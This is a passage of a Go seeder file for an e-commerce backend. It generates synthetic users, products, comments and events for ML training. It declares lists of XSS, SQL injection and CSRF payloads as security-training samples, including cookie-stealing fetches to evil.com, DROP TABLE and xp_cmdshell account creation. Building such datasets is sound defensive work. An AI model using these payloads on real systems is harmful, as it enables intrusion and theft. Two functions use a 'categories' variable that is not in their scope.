package database

import (
	"fmt"
	"log"
	"math/rand"
	"time"

	"bachelor_backend/models"

	"github.com/google/uuid"
	"github.com/lib/pq"
)

// Enhanced ML-focused seeder configuration
const (
	ML_USERS_COUNT               = 4000  // More users for better collaborative filtering
	ML_CATEGORIES_COUNT          = 25    // Focused categories for better classification
	ML_PRODUCTS_COUNT            = 10000 // More products for comprehensive similarity analysis
	ML_COMMENTS_PER_PRODUCT      = 8     // More comments for better sentiment analysis
	ML_FAVORITES_PER_USER        = 30    // More favorites for recommendation patterns
	ML_RECOMMENDATIONS_PER_USER  = 40    // More recommendations for ML training
	ML_USER_EVENTS_PER_USER      = 120   // More events for interaction patterns
	ML_HTTP_LOGS_COUNT           = 20000 // More logs for security analysis
	ML_PRODUCT_SUGGESTIONS_COUNT = 3000
	ML_SIMILARITY_DATA_COUNT     = 30000
)

// Enhanced product data organized by category for realistic ML training
var enhancedCategoryData = map[string]CategoryData{
	"Electronics": {
		Products: []ProductTemplate{
			{Name: "Wireless Bluetooth Headphones", Brands: []string{"SoundMax", "AudioPro", "BeatWave", "ClearSound"}, BasePrices: []float64{49.99, 99.99, 199.99, 399.99}, Tags: []string{"wireless", "bluetooth", "noise-cancelling", "premium"}},
			{Name: "4K Ultra HD Smart TV", Brands: []string{"ViewTech", "ScreenMaster", "DisplayPro", "SmartVision"}, BasePrices: []float64{299.99, 599.99, 999.99, 1899.99}, Tags: []string{"4k", "smart", "streaming", "large-screen"}},
			{Name: "Gaming Laptop", Brands: []string{"GameForce", "ProGamer", "EliteBook", "PowerPlay"}, BasePrices: []float64{799.99, 1299.99, 1999.99, 3199.99}, Tags: []string{"gaming", "high-performance", "rgb", "portable"}},
			{Name: "Smartphone", Brands: []string{"TechPhone", "SmartDevice", "MobileMax", "PhonePro"}, BasePrices: []float64{199.99, 499.99, 799.99, 1299.99}, Tags: []string{"mobile", "camera", "5g", "touchscreen"}},
			{Name: "Wireless Charging Station", Brands: []string{"ChargeFast", "PowerWave", "WirelessMax", "QuickCharge"}, BasePrices: []float64{24.99, 49.99, 79.99, 129.99}, Tags: []string{"wireless", "fast-charging", "multi-device", "compact"}},
			{Name: "Bluetooth Portable Speaker", Brands: []string{"SoundBlast", "BassBox", "AudioWave", "MusicMax"}, BasePrices: []float64{39.99, 89.99, 169.99, 299.99}, Tags: []string{"bluetooth", "portable", "waterproof", "bass-boost"}},
			{Name: "Gaming Mechanical Keyboard", Brands: []string{"KeyMaster", "GameKeys", "TypePro", "MechMax"}, BasePrices: []float64{69.99, 129.99, 199.99, 329.99}, Tags: []string{"mechanical", "gaming", "rgb", "tactile"}},
			{Name: "Wireless Gaming Mouse", Brands: []string{"ClickPro", "GameMouse", "PrecisionMax", "MouseMaster"}, BasePrices: []float64{34.99, 69.99, 119.99, 199.99}, Tags: []string{"wireless", "gaming", "precision", "ergonomic"}},
		},
		Descriptions: []string{
			"Experience premium quality with cutting-edge technology and innovative features",
			"Professional-grade performance meets sleek design in this high-tech device",
			"Advanced engineering delivers exceptional performance and reliability",
			"State-of-the-art technology with user-friendly interface and premium build quality",
		},
		CommonTags: []string{"tech", "modern", "wireless", "smart", "premium", "innovative"},
	},
	"Sports & Fitness": {
		Products: []ProductTemplate{
			{Name: "Adjustable Dumbbells Set", Brands: []string{"FitMax", "StrengthPro", "MuscleForce", "PowerFit"}, BasePrices: []float64{99.99, 199.99, 299.99, 499.99}, Tags: []string{"adjustable", "dumbbells", "strength", "home-gym"}},
			{Name: "Premium Yoga Mat", Brands: []string{"YogaMax", "FlexPro", "ZenMat", "FlowFit"}, BasePrices: []float64{24.99, 49.99, 79.99, 129.99}, Tags: []string{"yoga", "non-slip", "eco-friendly", "extra-thick"}},
			{Name: "Running Shoes", Brands: []string{"RunMax", "SpeedFit", "RacePro", "StrideForce"}, BasePrices: []float64{79.99, 129.99, 189.99, 279.99}, Tags: []string{"running", "cushioned", "breathable", "lightweight"}},
			{Name: "Resistance Bands Set", Brands: []string{"FlexBand", "ResistMax", "StretchPro", "BandForce"}, BasePrices: []float64{19.99, 34.99, 54.99, 79.99}, Tags: []string{"resistance", "portable", "full-body", "versatile"}},
			{Name: "Smart Fitness Tracker", Brands: []string{"FitTrack", "HealthMax", "WellnessPro", "VitalForce"}, BasePrices: []float64{59.99, 119.99, 199.99, 349.99}, Tags: []string{"fitness", "heart-rate", "waterproof", "gps"}},
			{Name: "Protein Powder", Brands: []string{"ProteinMax", "MuscleBuilder", "FitNutrition", "PowerProtein"}, BasePrices: []float64{29.99, 49.99, 69.99, 99.99}, Tags: []string{"protein", "muscle-building", "whey", "vanilla"}},
		},
		Descriptions: []string{
			"Professional-grade fitness equipment designed for optimal performance and durability",
			"Premium quality materials and ergonomic design for your fitness journey",
			"Scientifically engineered to maximize your workout effectiveness and comfort",
			"High-performance fitness solution with advanced features and proven results",
		},
		CommonTags: []string{"fitness", "workout", "healthy", "active", "sport", "training"},
	},
	"Beauty & Cosmetics": {
		Products: []ProductTemplate{
			{Name: "Anti-Aging Face Serum", Brands: []string{"GlowMax", "SkinPro", "BeautyElite", "YouthForce"}, BasePrices: []float64{24.99, 49.99, 89.99, 159.99}, Tags: []string{"anti-aging", "vitamin-c", "hydrating", "organic"}},
			{Name: "Long-Lasting Lipstick", Brands: []string{"LipMax", "ColorPro", "BeautyShade", "GlamForce"}, BasePrices: []float64{12.99, 24.99, 39.99, 59.99}, Tags: []string{"lipstick", "long-lasting", "matte", "cruelty-free"}},
			{Name: "Full Coverage Foundation", Brands: []string{"BaseMax", "CoverPro", "FlawlessShade", "PerfectForce"}, BasePrices: []float64{19.99, 34.99, 54.99, 79.99}, Tags: []string{"foundation", "full-coverage", "long-wear", "shade-inclusive"}},
			{Name: "Daily Moisturizer SPF", Brands: []string{"HydraMax", "SkinCare Pro", "MoisturePlus", "ProtectForce"}, BasePrices: []float64{16.99, 29.99, 49.99, 79.99}, Tags: []string{"moisturizer", "spf", "daily-use", "lightweight"}},
			{Name: "Eye Shadow Palette", Brands: []string{"EyeMax", "ShadePro", "ColorPlay", "GlamForce"}, BasePrices: []float64{24.99, 44.99, 69.99, 109.99}, Tags: []string{"eyeshadow", "palette", "pigmented", "blendable"}},
			{Name: "Hair Styling Iron", Brands: []string{"StyleMax", "HairPro", "SalonForce", "BeautyHeat"}, BasePrices: []float64{39.99, 79.99, 129.99, 219.99}, Tags: []string{"hair", "styling", "ceramic", "temperature-control"}},
		},
		Descriptions: []string{
			"Premium beauty products formulated with high-quality ingredients for lasting results",
			"Professional-grade cosmetics designed to enhance your natural beauty",
			"Luxurious skincare and makeup collection with dermatologist-tested formulas",
			"Innovative beauty solutions combining science and artistry for perfect results",
		},
		CommonTags: []string{"beauty", "skincare", "makeup", "cosmetic", "elegant", "premium"},
	},
	"Books & Media": {
		Products: []ProductTemplate{
			{Name: "Mystery Thriller Novel", Brands: []string{"BookMax", "ReadPro", "StoryForce", "PageTurner"}, BasePrices: []float64{9.99, 16.99, 24.99, 34.99}, Tags: []string{"mystery", "thriller", "bestseller", "paperback"}},
			{Name: "Self-Development Guide", Brands: []string{"WisdomMax", "GrowthPro", "SuccessForce", "MindBuilder"}, BasePrices: []float64{14.99, 22.99, 32.99, 44.99}, Tags: []string{"self-help", "personal-growth", "motivational", "practical"}},
			{Name: "Professional Cookbook", Brands: []string{"ChefMax", "CookPro", "RecipeForce", "CulinaryMaster"}, BasePrices: []float64{19.99, 29.99, 44.99, 64.99}, Tags: []string{"cookbook", "recipes", "illustrated", "gourmet"}},
			{Name: "Technical Programming Book", Brands: []string{"CodeMax", "TechPro", "DevForce", "ProgrammerGuide"}, BasePrices: []float64{34.99, 54.99, 79.99, 119.99}, Tags: []string{"programming", "technical", "tutorial", "reference"}},
			{Name: "Children's Educational Book", Brands: []string{"LearnMax", "KidsPro", "EduForce", "BrightMinds"}, BasePrices: []float64{8.99, 14.99, 22.99, 32.99}, Tags: []string{"children", "educational", "illustrated", "interactive"}},
		},
		Descriptions: []string{
			"Engaging and informative content that educates, entertains, and inspires readers",
			"Expertly written material with comprehensive coverage and practical insights",
			"High-quality publication featuring authoritative content and engaging presentation",
			"Premium literary work combining excellent storytelling with valuable knowledge",
		},
		CommonTags: []string{"book", "reading", "educational", "entertaining", "knowledge", "literature"},
	},
	"Home & Kitchen": {
		Products: []ProductTemplate{
			{Name: "Smart Coffee Maker", Brands: []string{"BrewMax", "CoffeePro", "JavaForce", "MorningMaster"}, BasePrices: []float64{79.99, 149.99, 249.99, 399.99}, Tags: []string{"coffee", "smart", "programmable", "thermal"}},
			{Name: "Non-Stick Cookware Set", Brands: []string{"CookMax", "KitchenPro", "ChefForce", "CulinaryMaster"}, BasePrices: []float64{59.99, 119.99, 199.99, 329.99}, Tags: []string{"cookware", "non-stick", "dishwasher-safe", "ceramic"}},
			{Name: "Digital Air Fryer", Brands: []string{"FryMax", "HealthyPro", "CrispForce", "AirMaster"}, BasePrices: []float64{79.99, 129.99, 199.99, 299.99}, Tags: []string{"air-fryer", "healthy", "digital", "oil-free"}},
			{Name: "Professional Knife Set", Brands: []string{"BladeMax", "SharpPro", "CutForce", "ChefMaster"}, BasePrices: []float64{49.99, 99.99, 169.99, 279.99}, Tags: []string{"knives", "stainless-steel", "sharp", "professional"}},
			{Name: "High-Speed Blender", Brands: []string{"BlendMax", "SmoothiePro", "MixForce", "LiquidMaster"}, BasePrices: []float64{69.99, 129.99, 219.99, 369.99}, Tags: []string{"blender", "high-speed", "smoothies", "ice-crush"}},
		},
		Descriptions: []string{
			"Premium kitchen appliances designed for efficiency, durability, and exceptional performance",
			"Professional-grade cookware and tools that elevate your culinary experience",
			"Innovative kitchen solutions combining modern technology with practical functionality",
			"High-quality home essentials crafted for everyday use and long-lasting reliability",
		},
		CommonTags: []string{"kitchen", "home", "cooking", "appliance", "practical", "durable"},
	},
}

type CategoryData struct {
	Products     []ProductTemplate
	Descriptions []string
	CommonTags   []string
}

type ProductTemplate struct {
	Name       string
	Brands     []string
	BasePrices []float64
	Tags       []string
}

// Enhanced user demographics for ML training
var enhancedRegions = []string{
	"United States", "Canada", "United Kingdom", "Germany", "France", "Japan",
	"China", "India", "Brazil", "Australia", "Mexico", "Italy", "Spain", "Russia",
	"Netherlands", "Sweden", "Norway", "Denmark", "South Korea", "Thailand",
}

// Age-based preferences for demographic modeling
var agePreferences = map[string][]string{
	"teen":        {"Electronics", "Gaming & Computers", "Sports & Fitness", "Books & Media"},
	"young-adult": {"Electronics", "Fashion & Clothing", "Beauty & Cosmetics", "Sports & Fitness"},
	"adult":       {"Home & Kitchen", "Electronics", "Books & Media", "Health & Wellness"},
	"middle-aged": {"Home & Kitchen", "Tools & Hardware", "Books & Media", "Health & Wellness"},
	"senior":      {"Books & Media", "Health & Wellness", "Home & Kitchen", "Garden & Outdoor"},
}

// Regional preferences for demographic modeling
var regionalPreferences = map[string][]string{
	"United States":  {"Electronics", "Sports & Fitness", "Automotive", "Home & Kitchen"},
	"Canada":         {"Electronics", "Sports & Fitness", "Outdoor Recreation", "Books & Media"},
	"United Kingdom": {"Books & Media", "Beauty & Cosmetics", "Fashion & Clothing", "Home & Kitchen"},
	"Germany":        {"Tools & Hardware", "Automotive", "Electronics", "Home & Kitchen"},
	"France":         {"Beauty & Cosmetics", "Fashion & Clothing", "Books & Media", "Home & Kitchen"},
	"Japan":          {"Electronics", "Gaming & Computers", "Beauty & Cosmetics", "Health & Wellness"},
	"China":          {"Electronics", "Fashion & Clothing", "Health & Wellness", "Home & Kitchen"},
	"India":          {"Electronics", "Books & Media", "Health & Wellness", "Fashion & Clothing"},
	"Brazil":         {"Sports & Fitness", "Beauty & Cosmetics", "Fashion & Clothing", "Electronics"},
	"Australia":      {"Sports & Fitness", "Outdoor Recreation", "Electronics", "Home & Kitchen"},
}

// Sentiment-based comments for realistic sentiment analysis training
var sentimentComments = map[string][]string{
	"very_positive": {
		"Absolutely amazing product! Exceeded all my expectations in every way possible.",
		"Outstanding quality and performance. This is hands down the best purchase I've made.",
		"Incredible value for money. Professional quality at an affordable price.",
		"Perfect in every aspect. Design, functionality, and durability are all top-notch.",
		"Exceptional product that delivers on all promises. Highly recommend to everyone!",
	},
	"positive": {
		"Great product! Really satisfied with the quality and performance.",
		"Very good value for money. Works exactly as described and advertised.",
		"Excellent quality and fast shipping. Would definitely purchase again.",
		"Really happy with this purchase. Good build quality and functionality.",
		"Solid product that meets all my needs. Recommend it to others.",
	},
	"neutral": {
		"Good product overall. Does what it's supposed to do adequately.",
		"Decent quality for the price. Nothing exceptional but functional.",
		"It's okay. Works as expected but nothing particularly impressive.",
		"Average product. Gets the job done but room for improvement.",
		"Acceptable quality. Some features could be better designed.",
	},
	"negative": {
		"Disappointed with the quality. Expected much better for this price.",
		"Product doesn't work as advertised. Several issues right out of the box.",
		"Poor build quality. Started having problems after just a few uses.",
		"Not worth the money. Many better alternatives available at this price.",
		"Unsatisfied with purchase. Quality control seems to be lacking.",
	},
	"very_negative": {
		"Terrible product! Complete waste of money and time.",
		"Worst purchase I've ever made. Product broke immediately after opening.",
		"Absolutely horrible quality. Feels cheap and poorly manufactured.",
		"Total disappointment. Product is nothing like what was advertised.",
		"Save your money and buy something else. This is completely useless.",
	},
}

// Enhanced attack patterns for comprehensive security ML training
var enhancedXSSAttacks = []string{
	"<script>alert('XSS Vulnerability Found')</script>",
	"<img src=x onerror=alert('XSS')>",
	"javascript:alert(document.cookie)",
	"<iframe src=javascript:alert('XSS')></iframe>",
	"<svg onload=alert('XSS')>",
	"<body onload=alert('Malicious Script')>",
	"<script>fetch('http://evil.com/steal?data='+document.cookie)</script>",
	"<img src=x onerror=fetch('http://attacker.com/log?'+document.location)>",
	"<script>eval(atob('YWxlcnQoJ1hTUycp'))</script>",
	"<object data='data:text/html,<script>alert(1)</script>'></object>",
	"<embed src='data:text/html,<script>alert(1)</script>'>",
	"<form><button formaction=javascript:alert(1)>Click</button></form>",
	"<details open ontoggle=alert(1)>XSS</details>",
	"<video><source onerror=alert(1)>",
	"<audio src=x onerror=alert(1)>",
}

var enhancedSQLInjectionAttacks = []string{
	"' OR '1'='1",
	"'; DROP TABLE users; --",
	"' UNION SELECT username, password FROM admin_users --",
	"admin'/**/--",
	"' OR 1=1 /*",
	"'; INSERT INTO users VALUES('hacker','password123'); --",
	"' AND 1=1 --",
	"' OR 'admin'='admin",
	"'; EXEC xp_cmdshell('net user hacker password123 /add'); --",
	"' UNION ALL SELECT NULL,concat(username,':',password),NULL FROM users --",
	"'; DELETE FROM products WHERE price > 0; --",
	"' OR ASCII(SUBSTRING((SELECT database()),1,1))>64 --",
	"'; WAITFOR DELAY '00:00:10'; --",
	"' AND (SELECT COUNT(*) FROM information_schema.tables)>0 --",
	"'; SELECT table_name FROM information_schema.tables --",
}

var enhancedCSRFAttacks = []string{
	"<form action='http://bank.com/transfer' method='post'><input name='to' value='attacker'><input name='amount' value='10000'><input type='submit' value='Click for Prize'></form>",
	"<img src='http://admin.site.com/delete_user?id=123&confirm=yes' style='display:none'>",
	"<iframe src='http://site.com/admin/change_password?new=hacked123&confirm=hacked123' style='display:none'></iframe>",
	"<script>fetch('/admin/promote', {method:'POST', body:'user=attacker&role=administrator', headers:{'Content-Type':'application/x-www-form-urlencoded'}})</script>",
	"<form action='/user/settings' method='post'><input name='email' value='attacker@evil.com'><input name='password' value='newpassword123'></form>",
	"<img src='/api/transfer?from=victim&to=attacker&amount=5000' style='position:absolute;left:-1000px'>",
	"<link rel='prefetch' href='/admin/delete_all_users?confirm=yes'>",
	"<form action='/api/users/delete' method='post'><input name='user_ids' value='1,2,3,4,5'></form>",
	"<script>setTimeout(function(){document.forms[0].submit()}, 1000)</script>",
	"<iframe src='/admin/backup_database?email_to=attacker@evil.com&delete_after=true' width='1' height='1'></iframe>",
}

// ClearDatabase clears all data from the database
func ClearDatabase() error {
	log.Println("🧹 Clearing all data from database...")

	// Order matters due to foreign key constraints
	tables := []string{
		"comment_votes",
		"comments",
		"recommendations",
		"favorites",
		"user_events",
		"http_request_logs",
		"product_similarity_data",
		"product_suggestions",
		"product_feature_vectors",
		"products",
		"categories",
		"users",
	}

	for _, table := range tables {
		if err := DB.Exec(fmt.Sprintf("DELETE FROM %s", table)).Error; err != nil {
			log.Printf("Warning: Failed to clear table %s: %v", table, err)
		} else {
			log.Printf("✅ Cleared table: %s", table)
		}
	}

	log.Println("✅ Database cleared successfully")
	return nil
}

// SeedDatabase seeds the database with ML training data
func SeedDatabase() error {
	return SeedDatabaseForML()
}

// countTotalRecords counts total records across all tables
func countTotalRecords() int64 {
	var total int64

	tables := map[string]interface{}{
		"users":                   &models.User{},
		"categories":              &models.Category{},
		"products":                &models.Product{},
		"comments":                &models.Comment{},
		"favorites":               &models.Favorite{},
		"recommendations":         &models.Recommendation{},
		"user_events":             &models.UserEvent{},
		"http_request_logs":       &models.HttpRequestLog{},
		"product_similarity_data": &models.ProductSimilarityData{},
	}

	for _, model := range tables {
		var count int64
		if err := DB.Model(model).Count(&count).Error; err == nil {
			total += count
		}
	}

	return total
}

// SeedDatabaseForML seeds the database with comprehensive ML training data
func SeedDatabaseForML() error {
	log.Println("🤖 Starting ML-focused database seeding...")

	// Clear existing data first
	if err := ClearDatabase(); err != nil {
		return fmt.Errorf("failed to clear database: %w", err)
	}

	startTime := time.Now()

	// Seed in dependency order
	users, err := seedEnhancedUsers()
	if err != nil {
		return fmt.Errorf("failed to seed users: %w", err)
	}

	categories, err := seedEnhancedCategories()
	if err != nil {
		return fmt.Errorf("failed to seed categories: %w", err)
	}

	products, err := seedEnhancedProducts(users, categories)
	if err != nil {
		return fmt.Errorf("failed to seed products: %w", err)
	}

	if err := seedEnhancedComments(users, products); err != nil {
		return fmt.Errorf("failed to seed comments: %w", err)
	}

	if err := seedEnhancedFavorites(users, products); err != nil {
		return fmt.Errorf("failed to seed favorites: %w", err)
	}

	if err := seedEnhancedUserEvents(users, products); err != nil {
		return fmt.Errorf("failed to seed user events: %w", err)
	}

	if err := seedEnhancedHttpLogs(users); err != nil {
		return fmt.Errorf("failed to seed HTTP logs: %w", err)
	}

	if err := seedEnhancedProductSimilarity(products); err != nil {
		return fmt.Errorf("failed to seed product similarity: %w", err)
	}

	duration := time.Since(startTime)
	totalRecords := countTotalRecords()

	log.Printf("🎉 ML-focused database seeding completed!")
	log.Printf("📊 Total records: %d", totalRecords)
	log.Printf("⏱️  Duration: %v", duration)
	log.Printf("🔬 ML models can now be trained with comprehensive, realistic data")

	return nil
}

func getAgeGroup(birthYear int) string {
	age := 2024 - birthYear
	switch {
	case age < 18:
		return "teen"
	case age < 25:
		return "young-adult"
	case age < 35:
		return "adult"
	case age < 50:
		return "middle-aged"
	case age < 65:
		return "senior"
	default:
		return "senior"
	}
}

func getPreferencesForDemographic(region string, ageGroup string) []string {
	// Combine regional and age preferences
	regionPrefs := regionalPreferences[region]
	if regionPrefs == nil {
		regionPrefs = []string{"Electronics", "Home & Kitchen", "Books & Media", "Sports & Fitness"}
	}

	agePrefs := agePreferences[ageGroup]
	if agePrefs == nil {
		agePrefs = []string{"Electronics", "Home & Kitchen", "Books & Media", "Sports & Fitness"}
	}

	// Merge preferences with some randomization
	combined := make(map[string]bool)
	for _, pref := range regionPrefs {
		combined[pref] = true
	}
	for _, pref := range agePrefs {
		combined[pref] = true
	}

	result := make([]string, 0, len(combined))
	for pref := range combined {
		result = append(result, pref)
	}

	return result
}

func seedEnhancedUsers() ([]models.User, error) {
	log.Printf("👥 Seeding %d enhanced users for ML training...", ML_USERS_COUNT)

	users := make([]models.User, ML_USERS_COUNT)
	batch := make([]models.User, 0, 500)

	for i := 0; i < ML_USERS_COUNT; i++ {
		// More realistic age distribution
		var birthYear int
		ageCategory := rand.Float64()
		switch {
		case ageCategory < 0.15: // 15% teens
			birthYear = 2006 + rand.Intn(6) // 2006-2011
		case ageCategory < 0.35: // 20% young adults
			birthYear = 1999 + rand.Intn(7) // 1999-2005
		case ageCategory < 0.65: // 30% adults
			birthYear = 1989 + rand.Intn(10) // 1989-1998
		case ageCategory < 0.85: // 20% middle-aged
			birthYear = 1974 + rand.Intn(15) // 1974-1988
		default: // 15% seniors
			birthYear = 1944 + rand.Intn(30) // 1944-1973
		}

		name := fmt.Sprintf("User %d", i+1)
		region := enhancedRegions[rand.Intn(len(enhancedRegions))]

		users[i] = models.User{
			ID:           uuid.New(),
			Email:        fmt.Sprintf("user%d@mltraining.com", i+1),
			PasswordHash: "$2a$10$example.hash.for.ml.training.purposes",
			Name:         &name,
			Region:       &region,
			BirthYear:    &birthYear,
			CreatedAt:    randomPastTime(400), // Created within last 400 days for variety
			IsAdmin:      i < 20,              // First 20 users are admins for testing
		}

		batch = append(batch, users[i])

		// Insert in batches for better performance
		if len(batch) == 500 || i == ML_USERS_COUNT-1 {
			if err := DB.CreateInBatches(&batch, 500).Error; err != nil {
				return nil, fmt.Errorf("failed to insert user batch: %w", err)
			}
			batch = batch[:0] // Reset batch
		}
	}

	log.Printf("✅ Successfully created %d users with diverse demographics", ML_USERS_COUNT)
	return users, nil
}

func seedEnhancedCategories() ([]models.Category, error) {
	log.Printf("📂 Seeding %d enhanced categories for ML training...", ML_CATEGORIES_COUNT)

	categoryNames := make([]string, 0, len(enhancedCategoryData))
	for categoryName := range enhancedCategoryData {
		categoryNames = append(categoryNames, categoryName)
	}

	categories := make([]models.Category, len(categoryNames))

	for i, name := range categoryNames {
		categories[i] = models.Category{
			ID:   uuid.New(),
			Name: name,
		}
	}

	if err := DB.CreateInBatches(&categories, 100).Error; err != nil {
		return nil, fmt.Errorf("failed to insert categories: %w", err)
	}

	log.Printf("✅ Successfully created %d focused categories", len(categories))
	return categories, nil
}

func seedEnhancedProducts(users []models.User, categories []models.Category) ([]models.Product, error) {
	log.Printf("📦 Seeding %d enhanced products for ML training...", ML_PRODUCTS_COUNT)

	products := make([]models.Product, 0, ML_PRODUCTS_COUNT)
	batch := make([]models.Product, 0, 500)
	productCounter := 0

	// Create products based on enhanced category data
	for categoryName, categoryData := range enhancedCategoryData {
		// Find the corresponding category
		var categoryID *uuid.UUID
		for _, cat := range categories {
			if cat.Name == categoryName {
				categoryID = &cat.ID
				break
			}
		}

		// Create multiple variations of each product template
		productsPerTemplate := ML_PRODUCTS_COUNT / (len(enhancedCategoryData) * len(categoryData.Products))
		if productsPerTemplate < 1 {
			productsPerTemplate = 1
		}

		for _, template := range categoryData.Products {
			for i := 0; i < productsPerTemplate && productCounter < ML_PRODUCTS_COUNT; i++ {
				// Create product variations
				brand := template.Brands[rand.Intn(len(template.Brands))]
				price := template.BasePrices[rand.Intn(len(template.BasePrices))]

				// Add price variation ±20%
				priceVariation := 0.8 + rand.Float64()*0.4 // 0.8 to 1.2
				finalPrice := price * priceVariation

				// Combine template tags with category tags
				allTags := make([]string, 0)
				allTags = append(allTags, template.Tags...)
				allTags = append(allTags, categoryData.CommonTags...)

				// Add some random tags for variety
				randomTags := []string{"bestseller", "new", "limited", "premium", "eco-friendly", "professional"}
				if rand.Float64() < 0.3 {
					allTags = append(allTags, randomTags[rand.Intn(len(randomTags))])
				}

				productName := fmt.Sprintf("%s %s", brand, template.Name)
				if i > 0 {
					productName = fmt.Sprintf("%s %s v%d", brand, template.Name, i+1)
				}

				description := categoryData.Descriptions[rand.Intn(len(categoryData.Descriptions))]
				createdBy := &users[rand.Intn(len(users))].ID

				product := models.Product{
					ID:          uuid.New(),
					Name:        productName,
					Description: &description,
					Price:       &finalPrice,
					CategoryID:  categoryID,
					Tags:        pq.StringArray(allTags),
					CreatedBy:   createdBy,
				}

				products = append(products, product)
				batch = append(batch, product)
				productCounter++

				// Insert in batches
				if len(batch) == 500 || productCounter == ML_PRODUCTS_COUNT {
					if err := DB.CreateInBatches(&batch, 500).Error; err != nil {
						return nil, fmt.Errorf("failed to insert product batch: %w", err)
					}
					batch = batch[:0]
				}
			}
		}
	}

	log.Printf("✅ Successfully created %d realistic products across %d categories", len(products), len(enhancedCategoryData))
	return products, nil
}

func seedEnhancedComments(users []models.User, products []models.Product) error {
	log.Printf("💬 Seeding enhanced comments for sentiment analysis training...")

	batch := make([]models.Comment, 0, 500)
	totalComments := 0

	for _, product := range products {
		// Each product gets a random number of comments
		numComments := 1 + rand.Intn(ML_COMMENTS_PER_PRODUCT*2)

		for i := 0; i < numComments; i++ {
			// Choose sentiment based on realistic distribution
			var sentiment string
			var commentBody string

			sentimentRoll := rand.Float64()
			switch {
			case sentimentRoll < 0.1: // 10% very negative
				sentiment = "negative"
				commentBody = sentimentComments["very_negative"][rand.Intn(len(sentimentComments["very_negative"]))]
			case sentimentRoll < 0.25: // 15% negative
				sentiment = "negative"
				commentBody = sentimentComments["negative"][rand.Intn(len(sentimentComments["negative"]))]
			case sentimentRoll < 0.45: // 20% neutral
				sentiment = "neutral"
				commentBody = sentimentComments["neutral"][rand.Intn(len(sentimentComments["neutral"]))]
			case sentimentRoll < 0.75: // 30% positive
				sentiment = "positive"
				commentBody = sentimentComments["positive"][rand.Intn(len(sentimentComments["positive"]))]
			default: // 25% very positive
				sentiment = "positive"
				commentBody = sentimentComments["very_positive"][rand.Intn(len(sentimentComments["very_positive"]))]
			}

			user := users[rand.Intn(len(users))]

			comment := models.Comment{
				ID:             uuid.New(),
				UserID:         user.ID,
				ProductID:      product.ID,
				Body:           commentBody,
				SentimentLabel: &sentiment,
				CreatedAt:      randomPastTime(200),
			}

			batch = append(batch, comment)
			totalComments++

			// Insert in batches
			if len(batch) == 500 {
				if err := DB.CreateInBatches(&batch, 500).Error; err != nil {
					return fmt.Errorf("failed to insert comment batch: %w", err)
				}
				batch = batch[:0]
			}
		}
	}

	// Insert remaining comments
	if len(batch) > 0 {
		if err := DB.CreateInBatches(&batch, 500).Error; err != nil {
			return fmt.Errorf("failed to insert final comment batch: %w", err)
		}
	}

	log.Printf("✅ Successfully created %d sentiment-labeled comments", totalComments)
	return nil
}

func seedEnhancedFavorites(users []models.User, products []models.Product) error {
	log.Printf("❤️  Seeding enhanced favorites for recommendation training...")

	batch := make([]models.Favorite, 0, 500)
	totalFavorites := 0

	for _, user := range users {
		// Get user's demographic preferences
		ageGroup := getAgeGroup(*user.BirthYear)
		preferences := getPreferencesForDemographic(*user.Region, ageGroup)

		// Each user gets favorites based on their demographics
		numFavorites := 10 + rand.Intn(ML_FAVORITES_PER_USER*2)
		favoriteProducts := make(map[uuid.UUID]bool)

		for i := 0; i < numFavorites; i++ {
			var selectedProduct models.Product

			// 70% chance to select from preferred categories, 30% random
			if rand.Float64() < 0.7 && len(preferences) > 0 {
				// Find products in preferred categories
				preferredCategoryProducts := make([]models.Product, 0)
				for _, product := range products {
					if product.CategoryID != nil {
						for _, cat := range categories {
							if cat.ID == *product.CategoryID {
								for _, pref := range preferences {
									if cat.Name == pref {
										preferredCategoryProducts = append(preferredCategoryProducts, product)
										break
									}
								}
								break
							}
						}
					}
				}

				if len(preferredCategoryProducts) > 0 {
					selectedProduct = preferredCategoryProducts[rand.Intn(len(preferredCategoryProducts))]
				} else {
					selectedProduct = products[rand.Intn(len(products))]
				}
			} else {
				selectedProduct = products[rand.Intn(len(products))]
			}

			// Avoid duplicate favorites
			if favoriteProducts[selectedProduct.ID] {
				continue
			}
			favoriteProducts[selectedProduct.ID] = true

			favorite := models.Favorite{
				ID:        uuid.New(),
				UserID:    user.ID,
				ProductID: selectedProduct.ID,
			}

			batch = append(batch, favorite)
			totalFavorites++

			// Insert in batches
			if len(batch) == 500 {
				if err := DB.CreateInBatches(&batch, 500).Error; err != nil {
					return fmt.Errorf("failed to insert favorite batch: %w", err)
				}
				batch = batch[:0]
			}
		}
	}

	// Insert remaining favorites
	if len(batch) > 0 {
		if err := DB.CreateInBatches(&batch, 500).Error; err != nil {
			return fmt.Errorf("failed to insert final favorite batch: %w", err)
		}
	}

	log.Printf("✅ Successfully created %d demographically-aligned favorites", totalFavorites)
	return nil
}

func seedEnhancedUserEvents(users []models.User, products []models.Product) error {
	log.Printf("📊 Seeding enhanced user events for interaction analysis...")

	batch := make([]models.UserEvent, 0, 500)
	totalEvents := 0

	for _, user := range users {
		// Each user generates events based on realistic patterns
		numEvents := 50 + rand.Intn(ML_USER_EVENTS_PER_USER*2)

		// Get user preferences for more realistic event patterns
		ageGroup := getAgeGroup(*user.BirthYear)
		preferences := getPreferencesForDemographic(*user.Region, ageGroup)

		for i := 0; i < numEvents; i++ {
			var selectedProduct models.Product

			// 60% chance to interact with preferred categories
			if rand.Float64() < 0.6 && len(preferences) > 0 {
				// Find products in preferred categories
				preferredProducts := make([]models.Product, 0)
				for _, product := range products {
					if product.CategoryID != nil {
						for _, cat := range categories {
							if cat.ID == *product.CategoryID {
								for _, pref := range preferences {
									if cat.Name == pref {
										preferredProducts = append(preferredProducts, product)
										break
									}
								}
								break
							}
						}
					}
				}

				if len(preferredProducts) > 0 {
					selectedProduct = preferredProducts[rand.Intn(len(preferredProducts))]
				} else {
					selectedProduct = products[rand.Intn(len(products))]
				}
			} else {
				selectedProduct = products[rand.Intn(len(products))]
			}

			// Event type distribution: views are most common, purchases least common
			var eventType string
			eventRoll := rand.Float64()
			switch {
			case eventRoll < 0.5: // 50% views
				eventType = "view"
			case eventRoll < 0.7: // 20% clicks
				eventType = "click"
			case eventRoll < 0.85: // 15% add to cart
				eventType = "add_to_cart"
			case eventRoll < 0.95: // 10% comments
				eventType = "comment"
			default: // 5% favorites
				eventType = "favorite"
			}

			event := models.UserEvent{
				ID:        uuid.New(),
				UserID:    user.ID,
				ProductID: &selectedProduct.ID,
				EventType: eventType,
				Timestamp: randomPastTime(100),
			}

			batch = append(batch, event)
			totalEvents++

			// Insert in batches
			if len(batch) == 500 {
				if err := DB.CreateInBatches(&batch, 500).Error; err != nil {
